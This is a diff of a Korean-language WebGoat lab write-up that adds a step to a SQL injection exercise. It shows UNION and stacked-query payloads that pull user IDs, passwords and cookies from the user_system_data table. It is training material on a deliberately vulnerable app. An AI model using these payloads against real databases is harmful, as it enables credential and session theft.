@@ -7,7 +7,11 @@ Union을 이용해서 위의 테이블과 밑의 테이블을 강제로 합침<b
 Smith' union select userid, user_name, password, cookie, null, null, null  from user_system_data where 1=1 --를 입력<br>
 ![image](https://github.com/Bottomdeal/WebGoat/assets/120577570/768f7aed-f60d-43f2-9405-41126937cb84)<hr>
 Dave의 패스워드를 입력<br>
-![image](https://github.com/Bottomdeal/WebGoat/assets/120577570/03ad857e-7714-4fc3-9f51-5070b90f6061)
+![image](https://github.com/Bottomdeal/WebGoat/assets/120577570/03ad857e-7714-4fc3-9f51-5070b90f6061)<hr>
+
+'; select *  from user_system_data --  를 입력<br>
+![image](https://github.com/Bottomdeal/WebGoat/assets/120577570/6d4f045b-2e95-46ef-a41f-43749b3c9eb9)
+
 
 
 
